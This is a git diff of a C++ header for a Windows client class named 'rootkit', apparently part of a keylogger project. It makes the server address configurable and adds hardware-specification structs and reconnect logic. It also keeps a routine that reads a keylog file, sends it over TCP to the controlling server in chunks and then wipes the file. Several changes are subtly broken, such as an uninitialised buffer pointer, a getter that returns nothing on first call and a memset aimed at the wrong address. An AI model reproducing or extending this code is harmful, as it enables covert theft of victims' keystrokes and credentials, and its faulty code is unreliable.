@@ -1,16 +1,70 @@
 #pragma once
+
 #include "common.h"
 #include <tchar.h>
+
 constexpr unsigned short UNLEN = 256;
-constexpr char SERVER_ADDR[] = "127.0.0.1";
 constexpr unsigned int MAX_PACKET_SIZE = 1024;
 constexpr unsigned short CHUNCK_SIZE = 1024;
 
-
-struct data_chunck
-{
-	char content[CHUNCK_SIZE];
+struct data_chunck {
+	char* content;
 	unsigned long iteration;
+};
+
+namespace hardware {
+	typedef struct {
+		char name[256]; //yeah it's wastefull but saves me alot of time
+		int clock_speed_ghz;
+		int core_count;
+	}cpu_specs;
+
+	typedef struct {
+		float size;
+		char name[256];
+	}hdd_specs;
+
+	typedef struct {
+		char name[256];
+		float v_ram;
+	}gpu_specs;
+
+	typedef struct {
+		cpu_specs cpu;
+		gpu_specs gpu;
+		hdd_specs hdd;
+
+		float ram;		//  physical ram + virtual ram ~= 35gb
+	} client_specs;
+
+	struct user {
+		SOCKET fd;
+		client_specs specs;
+		char username[256];
+	};
+
+	class hardware_info {
+	private:
+		client_specs* specs; // caches client_specs in case of disconnect
+
+	public:
+		hardware_info() :
+			specs(nullptr) {
+		}
+
+		~hardware_info() {
+			delete specs;
+		}
+
+		inline client_specs *get() {
+			if (specs == nullptr) {
+				specs = new client_specs;
+			}
+			else
+				return specs;
+
+		}
+	};
 };
 
 namespace network
@@ -43,14 +97,16 @@ namespace network
 	private:
 		wsa_wrapper _wsa;
 
-		unsigned short _port;
+		unsigned short _port;		//used for reconnecting purposes
+		char* server_addr;	//same 
+
 		sockaddr_in recvAddr{};
 	public:
 		SOCKET socket_fd;
-		rootkit(unsigned short port): _wsa(), _port(port)
+		rootkit(const char *host_addr, unsigned short port) : _wsa(), _port(port)
 		{
-			init(port);
-			
+			init(host_addr, _port);
+
 			if (connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr)) == 0)
 			{
 				std::string name = get_name();
@@ -58,11 +114,16 @@ namespace network
 			}
 		}
 
-		void init(unsigned short port)
+		~rootkit() {
+			delete[] server_addr;
+		}
+
+		// max port size is 2*16 anyway so there is no real performance benefit from using 32 bit a register
+		void init(const char *Dst, unsigned short port)
 		{
 			recvAddr.sin_family = AF_INET;
 			recvAddr.sin_port = htons(port);
-			inet_pton(AF_INET, (PCSTR)SERVER_ADDR, &recvAddr.sin_addr);
+			inet_pton(AF_INET, (PCSTR)Dst, &recvAddr.sin_addr);
 
 			//tcp file descriptor used for connecting and I/O operations and such
 			if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
@@ -74,9 +135,9 @@ namespace network
 				*/
 		}
 
-		bool reconnect()
+		bool reconnect(const char *server_Dst, unsigned short port)
 		{
-			init(_port);
+			init(server_Dst, port);
 			while (true)
 			{
 				std::cout << "reconnect" << std::endl;
@@ -91,16 +152,21 @@ namespace network
 						{
 							char res[255]; //output
 							WideCharToMultiByte(CP_UTF8, 0, usrname, -1, res, sz, NULL, NULL);
-							
-							send(socket_fd, res, sz , 0);
+
+							send(socket_fd, res, sz, 0);
 							std::cout << "sending: " << res << std::endl;
-							
+
 							return true;
 						}
 					}
 					return false;
 				}
 			}
+		}
+
+		inline void set_addr(const char* server_Dst, size_t str_size) {
+			void* str_ptr = reinterpret_cast<void*>(&server_Dst);
+			std::memset(str_ptr, 0, str_size);
 		}
 
 		std::string get_name()
@@ -125,7 +191,7 @@ namespace network
 
 		bool send_text(std::string buffer)
 		{
-			std::cout << "send" << buffer <<  std::endl;
+			std::cout << "send" << buffer << std::endl;
 			//compiler likes to bitch about data loss conversion for some reason so i used a static_cast
 			int bytes_received = send(socket_fd, buffer.c_str(), buffer.size(), 0);
 			if (bytes_received == SOCKET_ERROR)
@@ -133,7 +199,7 @@ namespace network
 				std::cout << "Error: " << _wsa.getError() << std::endl;
 				return false;
 			}
-			
+
 
 			return true;
 		}
@@ -142,7 +208,7 @@ namespace network
 		bool recv_text(std::string& buffer)
 		{
 			// stack should be more efficient when handling small packets such as this
-			char tmp[MAX_PACKET_SIZE]{0};
+			char tmp[MAX_PACKET_SIZE]{ 0 };
 			int res = recv(socket_fd, tmp, sizeof(tmp), 0);
 			switch (res)
 			{
@@ -178,7 +244,7 @@ namespace network
 			fd.seekg(0, std::ios::end);
 			long fd_sz = fd.tellg();
 			fd.seekg(0, std::ios::beg);
-				   
+
 			struct data_chunck buffer;
 			long fd_pos = 0;
 			std::cout << "keylog snd: " << fd_pos << " " << fd_sz << std::endl;
@@ -193,11 +259,11 @@ namespace network
 				{
 					fd.seekg(fd_pos - fd_pos, std::ios::beg);
 					fd.read(buffer.content, fd_sz - fd_pos);
-					
+
 					buffer.iteration = 0;
 					send(socket_fd, reinterpret_cast<const char*> (&buffer), sizeof(buffer), 0);
 					fd.close();
-					
+
 					return true;
 				}
 
@@ -205,11 +271,11 @@ namespace network
 				fd.read(buffer.content, CHUNCK_SIZE);
 				buffer.iteration = fd_sz - fd_pos;
 
-				send(socket_fd, reinterpret_cast<const char *>(&buffer), sizeof(buffer), 0);
+				send(socket_fd, reinterpret_cast<const char*>(&buffer), sizeof(buffer), 0);
 				fd_pos += CHUNCK_SIZE;
 			}
 			fd.close();
-			
+
 			//clear file content's
 			std::ofstream file(path.c_str(), std::ofstream::out | std::ofstream::trunc);
 			file.close();
